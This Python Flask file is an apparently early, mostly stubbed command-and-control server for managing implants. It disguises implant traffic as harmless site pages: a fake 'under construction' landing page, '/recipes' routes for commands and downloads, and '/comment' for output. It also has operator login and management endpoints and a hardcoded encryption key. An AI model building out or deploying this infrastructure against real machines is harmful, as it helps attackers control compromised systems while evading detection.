from modules import encryption
from modules import server_codes
from modules import storage
from datetime import datetime
from flask import Flask, request, make_response, jsonify
import random
import json
import requests

# Constants, to be changed via config file or command line params later
SERVER_IP = "0.0.0.0"
SERVER_PORT = 80
ENC_KEY = "thisisakey:)1234"
RANDOM_SLEEP = False
SLEEP_DURATION = 10 # If random sleep is set to true, will have a % and use rand() % (SLEEP_DURATION+1)

# Init the flask app
app = Flask(__name__)

# Globals for storage
operator_db = storage.OperatorDatabase()
implant_db = storage.ImplantDatabase()
AES_INSTANCE = encryption.AESCipher(ENC_KEY)

### Start the routing ###
# Default dummy page
@app.route("/", methods=['GET'])
def under_construction():
    return "<h3>Site is still under construction, come back soon!</h3>"

# The login route for implants
@app.route("/login", methods=['POST'])
def implant_register():
    return "TODO"

# The command recieve route for implants
@app.route("/recipes")
def implant_command():
    return "TODO"

# The file download route for implants
@app.route("/recipes/download/<ID>")
def implant_download():
    return "TODO"

# The response route for output from implants
@app.route("/comment", methods=['POST'])
def implant_response():
    return "TODO"

# Operator connects to this endpoint to login
@app.route("/admin/login", methods=['POST'])
def operator_login():
    # Error response, assigned in the expect block
    try:
        # Extract values from login
        r_json = request.get_json()
        # Make sure the operator name doesn't already exist
        if not operator_db.is_unique(r_json["username"]):
            return server_codes.ServerErrors.ERR_OPERATOR_NAME_EXISTS.value
        
        # Add the operator to db
        operator_db.add_operator(r_json["username"],
                                 storage.Operator(
                                     name=r_json["username"],
                                     IP=r_json["lip"],
                                     port=r_json["lport"]
                                     )
                                 )
        # Now create the response, a dict of implant objects
        # but only with the included data
        resp_db = {}
        for implant in implant_db.dict:
            resp_db[implant] = implant_db.dict[implant].__dict__
        resp_json = {"implant_db": resp_db}

        # Send back the data inside the implant_db on the server
        return jsonify(resp_json)
    # TODO: Make some proper error catching stuff for the server
    except Exception as err:
        print(repr(err))
        return server_codes.ServerErrors.ERR_LOGIN_EXCEPTION.value

# Operator connects to this endpoint to get updated data
@app.route("/admin/update/<TO_UPDATE>", methods=['GET'])
def update_db(TO_UPDATE):
    # Sends back a JSON of the implant db
    if TO_UPDATE == "implants":
        resp_db = {}
        for implant in implant_db.dict:
            resp_db[implant] = implant_db.dict[implant].__dict__ 
        resp_json = {"implant_db": resp_db}
        return jsonify(resp_json)

    return ""

# Operator connects to this endpoint to send a command string
@app.route("/admin/management", methods=['POST'])
def str_command():
    print(request.get_data())
    return "0"

# Operator connects to this endpoint to send a file to upload
# to the requested implant
@app.route("/admin/management/upload", methods=['POST'])
def operator_upload():
    return "TODO"

if __name__ == "__main__":
    print(f"Starting C1.5 Server on {SERVER_IP} on port {SERVER_PORT}")
    # Put the flask server on a seperate thread, continue on to use the CLI interface
    app.run(host=SERVER_IP, port=SERVER_PORT, debug=False, use_reloader=False)
